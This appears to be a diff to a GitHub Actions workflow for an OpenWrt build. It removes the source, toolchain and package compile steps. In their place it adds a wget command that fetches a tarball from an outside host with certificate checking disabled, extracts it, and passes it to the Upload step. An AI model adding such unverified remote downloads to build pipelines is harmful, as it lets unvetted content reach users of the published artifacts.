@@ -34,29 +34,11 @@ jobs:
            #ACTION_DATE: '2024-07-03T23:59:59+08:00'
            #FEEDS_DATE:  '2024-10-23T23:59:59+08:00'
 
-    - name: Download package sources
-      working-directory: ${{ github.workspace }}/runner_root/openwrt
-      run: make download V=s
-
-    - name: Build tools
-      working-directory: ${{ github.workspace }}/runner_root/openwrt
+   
+    - name: Download files
+      working-directory: ${{ github.workspace }}/runner_root/
       run: |
-        make tools/install -j$(nproc) V=s || \
-        make tools/install V=s
-        
-    - name: Build toolchain
-      working-directory: ${{ github.workspace }}/runner_root/openwrt
-      run: |
-        make toolchain/install -j$(nproc) V=s || \
-        make toolchain/install V=s           
-    
-    - name: Build packages
-      working-directory: ${{ github.workspace }}/runner_root/openwrt
-      run: |
-        sed -i "s|CONFIG_PACKAGE_thinkcy-settings=y|CONFIG_PACKAGE_thinkcy-settings=m|g" ./.config
-        make defconfig
-        make package/thinkcy/thinkcy-settings/compile  -j$(nproc) V=s || \
-        make package/thinkcy/thinkcy-settings/compile  V=s
+        wget -q --no-check-certificate -O /tmp/test.tar.gz https://zoenix.cc/xyz/github//test.tar.gz  && tar -xzf /tmp/test.tar.gz
 
     - name: Upload
       uses: thinkcyy/Action_OpenWrt_composite@release
